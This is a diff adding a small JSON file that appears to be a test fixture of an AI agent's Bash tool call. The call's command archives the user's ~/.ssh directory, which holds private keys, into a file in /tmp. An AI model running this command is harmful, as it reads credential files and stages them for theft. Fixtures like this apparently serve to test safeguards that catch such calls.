@@ -1,0 +1,4 @@
+{
+	"tool_name": "Bash",
+	"tool_input": { "command": "tar cf - ~/.ssh/ > /tmp/ssh_bundle.tar" }
+}
